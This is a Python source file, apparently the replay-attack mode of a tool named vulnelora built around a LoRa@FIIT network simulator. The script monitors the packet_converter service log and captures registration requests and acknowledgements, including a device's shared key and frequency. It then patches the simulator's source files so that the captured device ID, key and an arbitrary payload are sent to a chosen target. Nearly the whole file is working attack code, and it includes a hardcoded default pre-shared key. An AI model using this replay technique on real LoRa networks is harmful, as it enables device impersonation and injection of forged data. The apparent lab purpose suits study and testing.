#!/usr/bin/env python3

import os
import re
import sys
import json
import subprocess


save_flag = 0
service_path = "/opt/vulnelora"
end_devices = []
sim_path = f"{service_path}/resources/lora-ap-sim/src"
ap_id = "123456"


attack_config = {'target_ip': "127.0.0.1",
'target_port': 25001,
'payload': "",
'print_all': False
}


def check_save():
    if save_flag == 0:
        print("\n>> Current attack configuration not saved, would you like to save it? [y/n] ", end='')
        save_req = input()

        if save_req.strip().lower() == "y":
            print("\n>> Enter path (including file name) where the attack configuration should be saved: ", end='')
            path = input()
            save_conf(path)
        elif save_req.strip().lower() == "n":
            pass
        else:
            print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")


def extract(text, value):
    return text[len(value)+1:].strip()


def validate_path(value):
    if os.path.exists(value):
        return os.path.getsize(value) > 0
    else:
        return 0


def print_args():
    formatted_args = json.dumps(attack_config, indent=4)
    print(formatted_args)


def save_conf(path):
    with open(path, 'w') as file_w:
        json.dump(attack_config, file_w)
    with open(path, 'r') as file_r:
        file_content = json.load(file_r)
        if file_content == attack_config:
            global save_flag
            save_flag = 1
            print(f"\n>> [SUCCESS]: Current attack configuration saved successfully in '{path}'!")
        else:
            print("\n>> [ERROR]: Attack configuration has not beed saved correctly due to unknown error. Please, try again.")


def transfer_conf(loaded_conf):
        global attack_config
        attack_config.update(loaded_conf)


def is_present(id, array):
    for device in array:
        if id == device['id']:
            return True
    return False


def run_attack():
    global ap_id
    print("\n[INFO]: Started listening to LoRa@FIIT registration message...\n")

    try:
        pattern = r'{.*}'
        curr_reg_freq = ""
        curr_reg_id = ""
        psk = ""
        confirm_freq_flag = False
        ap_id = "123456"
        command = ['journalctl', '-u', 'packet_converter', '-f']
        end_devices = []

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        for line in iter(process.stdout.readline, b''):
            if '{"message_body":'.encode() in line:
                json_data = re.search(pattern, line.decode())
                parsed = json.loads(json_data.group(0))

                if attack_config['print_all']:
                    print(f">> \033[91mMessage\033[0m ==> {parsed}\n")

                msg_name = parsed['message_name']
                if "SET" not in msg_name:
                    dev_id = parsed['message_body']['dev_id']

                if "SETR" in msg_name:
                    if parsed['message_body']['id'] != ap_id:
                        ap_id = parsed['message_body']['id']
                        print(f"[INFO]: Found ID of the current AP - {ap_id}\n")
                    continue
                elif "SETA" in msg_name:
                    continue

                if 'freq' in parsed['message_body'] and confirm_freq_flag:
                    curr_frequency = parsed['message_body']['freq']
                    if dev_id == curr_reg_id and str(curr_frequency) == str(curr_reg_freq):
                        print(f"[SUCCESS]: Transmit frequency confirmed for a device with ID {dev_id}")
                        generate_sim_command(curr_reg_id, curr_reg_freq, "10", "7", "-1", psk)
                        process.terminate()
                        return
                    else:
                        continue

                if "REGR" in msg_name and not confirm_freq_flag:
                    if not is_present(dev_id, end_devices) and 'freq' in parsed['message_body']:
                        end_devices.append({'id': dev_id, 'freq': parsed['message_body']['freq']})
                    print(f"\033[91m!!! CAUGHT REGISTRATION REQUEST !!!\033[0m")
                    print(30 * f"\033[91m#\033[0m")
                    print(f">> \033[91mMessage\033[0m ==> {parsed}")
                    print(30 * f"\033[91m#\033[0m")
                    print()

                if "REGA" in msg_name and not confirm_freq_flag:
                    print(f"\033[91m!!! CAUGHT REGISTRATION ACK !!!\033[0m")
                    print(30 * f"\033[91m#\033[0m")
                    print(f">> \033[91mMessage\033[0m ==> {parsed}")
                    print(30 * f"\033[91m#\033[0m")
                    print()

                    if is_present(dev_id, end_devices) and 'sh_key' in parsed['message_body']:
                        print(f"[SUCCESS]: Got all required data for ID {dev_id}, replay this device? (y/n) ", end='')
                        confirm = input()

                        if confirm.upper() == "Y":
                            for device in end_devices:
                                if dev_id == device['id']:
                                    curr_reg_freq = device['freq']
                            curr_reg_id = dev_id
                            psk = parsed['message_body']['sh_key']
                            print("\n[INFO]: Waiting for the frequency confirmation...\n")
                            confirm_freq_flag = True
                            continue
    except KeyboardInterrupt:
        process.terminate()
        return
    except Exception as e:
        process.terminate()
        print(f"[ERROR]: Unexpected error occurred: {str(e)}")


def reset_sim():
    replace_line(f"{sim_path}/node.py", '# rssi_conf_point', '        rssi = LoRa.calculate_rssi(power, TRANS_ANT_GAIN, REC_ANT_GAIN, freq / 1000000, distance)')
    replace_line(f"{sim_path}/node.py", '# snr_conf_point', '        snr = LoRa.get_snr()')
    replace_line(f"{sim_path}/node.py", '# freq_conf_point', '        freq = freq')
    replace_line(f"{sim_path}/node.py", '# sf_conf_point', '        sf = sf')
    replace_line(f"{sim_path}/node.py", '# payload_conf_point', '        app_data = LoRa.get_data(self.x, self.y)')
    replace_line(f"{sim_path}/main.py", '# server_conf_point', '    conn.connect(\"127.0.0.1\", 8002)')
    replace_line(f"{sim_path}/main.py", '# node_id_conf_point', '        node_ids = load_nodes(node_file)')
    replace_line(f"{sim_path}/lora.py", '# psk_conf_point', "PRE_SHARED_KEY = '+/////v////7////+////wIAAAA='")


def replace_line(file_path, search_string, replace_string):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    found = False
    for i, line in enumerate(lines):
        if search_string in line:
            lines[i+1] = replace_string + '\n'
            found = True
            break

    if found:
        with open(file_path, 'w') as file:
            file.writelines(lines)
    else:
        print("[ERROR]: Could not change the specified parameter. Try again, please.")


def check_node_generator():
    with open(f"{sim_path}/data/group.txt", 'r') as file:
        line_count = sum(1 for line in file)

    return line_count == 1


def generate_sim_command(dev_id, freq, snr, sf, rssi, psk):
    replace_line(f'{sim_path}/main.py', '# server_conf_point', f"    conn.connect(\"{attack_config['target_ip']}\", {attack_config['target_port']})")
    replace_line(f"{sim_path}/main.py", '# node_id_conf_point', f"        node_ids = [\"{dev_id}\"]")
    replace_line(f"{sim_path}/lora.py", '# psk_conf_point', f"PRE_SHARED_KEY = '{psk}'")

    replace_line(f'{sim_path}/node.py', '# rssi_conf_point', f"        rssi = {rssi}")
    replace_line(f'{sim_path}/node.py', '# snr_conf_point', f"        snr = {snr}")
    replace_line(f'{sim_path}/node.py', '# freq_conf_point', f"        freq = {freq}")
    replace_line(f'{sim_path}/node.py', '# sf_conf_point', f"        sf = {sf}")

    if attack_config['payload'] != "":
        replace_line(f'{sim_path}/node.py', '# payload_conf_point', f"        app_data = \"{attack_config['payload']}\"")

    if check_node_generator():
        print("\n[SUCCESS]: End node generated successfully!\n")
    else:
        print("[ERROR]: There was a problem generating the end node.\n")
        check_save()
        reset_sim()

    print(f"[SUCCESS]: Simulation configured, please run the following command: vulnelora -S -run \"-i {ap_id} -r\"\n")


def detect_service():
    try:
        result = subprocess.run(['systemctl', 'status', 'packet_converter.service'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if result.returncode == 0 or result.returncode == 3:
            return True
        else:
            return False
    except Exception as e:
        print(e)


def validate_ip(ip):
    pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'

    if re.match(pattern, ip):
        return True
    return False


def argument_parser():
    argument = sys.argv[1]
    base_name, extension = os.path.splitext(argument)

    while True:
        print(f"\033[96m\nvulnelora\033[0m[\033[91m{base_name}\033[96m]>\033[0m ", end='')
        arg_input = input()

        if arg_input == "help":
            with open(f"{service_path}/modes/help_messages/replay.txt", 'r') as file:
                file_content = file.read()
                print(file_content)
        elif "payload" in arg_input:
            tmp_payload = extract(arg_input, "payload")
            attack_config['payload'] = tmp_payload
            print(f"\n>> Set argument: payload={tmp_payload}")
        elif "target_ip" in arg_input:
            tmp_ip = extract(arg_input, "target_ip")
            if validate_ip(tmp_ip):
                attack_config['target_ip'] = tmp_ip
                print(f"\n>> Set argument: target_ip={tmp_ip}")
            else:
                attack_config['target_ip'] = "127.0.0.1"
                print("\n>> Set argument: target_ip='127.0.0.1' (revert to default value, must be a valid IP address)")
        elif "target_port" in arg_input:
            tmp_port = extract(arg_input, "target_port")
            try:
                int_tmp_port = int(tmp_port)
                if 1 <= int_tmp_port <= 65535:
                    attack_config['target_port'] = tmp_port
                    print(f"\n>> Set argument: target_port={tmp_port}")
                else:
                    raise ValueError()
            except ValueError:
                attack_config['target_port'] = 8002
                print("\n>> Set argument: target_port=8002 (revert to default value, port must be from 1 to 65535)")
        elif "print_all" in arg_input:
            if arg_input == "print_all true":
                attack_config['print_all'] = True
                print(f"\n>> Enabled argument: print_all")
            else:
                attack_config['print_all'] = False
                print(f"\n>> Disabled argument: print_all")
        elif arg_input == "print":
            print("\n>> Current argument configuration:")
            print_args()
        elif "save" in arg_input:
            tmp_path = extract(arg_input, 'save')
            if validate_path(tmp_path):
                print("\n>> Path to save current attack configuration already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    save_conf(tmp_path)
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_path != "":
                    save_conf(tmp_path)
                else:
                    print("\n>> [ERROR]: Attack configuration not saved. Please, input a valid path (including file name).")
        elif "load" in arg_input:
            tmp_path = extract(arg_input, 'load')
            if validate_path(tmp_path) and tmp_path != "":
                with open(tmp_path, 'r') as file:
                    file_content = json.load(file)
                    transfer_conf(file_content)
                    if attack_config == file_content:
                        print("\n>> [SUCCESS]: Attack configuration has been loaded successfully! Current configuration is:")
                        print_args()
                    else:
                        print("\n>> [ERROR]: Attack configuration has not been loaded due to unknown error. Please, try again.")
            else:
                print("\n>> [ERROR]: File does not exist.")
        elif arg_input == "finish":
            print("\n>> Final attack configuration:")
            print_args()
            print()
            check_save()
            break
        elif arg_input == "exit":
            check_save()
            reset_sim()
            exit(0)
        else:
            print(f"\n[ERROR]: Unknown argument '{arg_input}'. Type 'help' to see the supported arguments.")


if __name__ == "__main__":
    try:
        if not detect_service():
            print("\n[ERROR]: Missing packet_converter service, cannot run this attack\n")
            exit(1)

        reset_sim()
        argument_parser()
        run_attack()
    except KeyboardInterrupt:
        reset_sim()
        exit(0)

    exit(0)
